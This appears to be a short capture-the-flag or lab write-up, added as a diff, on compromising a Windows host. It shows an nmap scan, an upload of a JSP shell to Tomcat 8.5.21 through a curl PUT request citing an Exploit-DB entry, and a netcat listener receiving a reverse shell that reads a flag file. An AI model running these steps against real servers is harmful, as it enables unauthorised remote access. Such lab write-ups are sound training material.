@@ -1,0 +1,72 @@
+## Enumeration
+root@kali:~/Downloads# nmap -Pn -sV -sC 192.168.58.42
+
+nmap
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           FreeFloat ftpd 1.00
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: PASV failed: 500 'PASV': command not understood
+|_ftp-bounce: bounce working!
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=HomeStudy
+| Issuer: commonName=HomeStudy
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-04-02T08:17:59
+| Not valid after:  2020-10-02T08:17:59
+| MD5:   1d26 61f4 34f0 1ba7 aa44 2bd1 b921 9d3c
+|_SHA-1: ef39 1263 a979 a858 fb5f 2afb 6694 9ac1 2796 264d
+|_ssl-date: 2020-04-27T18:07:14+00:00; 0s from scanner time.
+8009/tcp  open  ajp13         Apache Jserv (Protocol v1.3)
+|_ajp-methods: Failed to get a valid response for the OPTION request
+8080/tcp  open  http          Apache Tomcat 8.5.21
+|_http-favicon: Apache Tomcat
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-title: Apache Tomcat/8.5.21
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+
+```
+
+```
+
+#Low Shell
+
+https://www.exploit-db.com/exploits/42953
+
+```
+
+```
+
+root@kali:~/Downloads# curl -X PUT http://192.168.52.42:8080/shell.jsp/ -d @- < shell.jsp
+
+```
+
+```
+root@kali:~/Downloads# nc -lnvp 1337
+listening on [any] 1337 ...
+connect to [xxxxxx] from (UNKNOWN) [192.168.52.42] 49685
+Microsoft  Windows [Version 10.0.16.299.967]
+(c) 2017 Microsoft Corporation. All rights reserved.
+
+C:\Program Files (x86)\Apache Software Foundation\Tomcat 8.5>
+```
+
+```
+C:\Users\Rob\Desktop\>type local.txt
+type local.txt
+ed8....
+
+```
+
+```
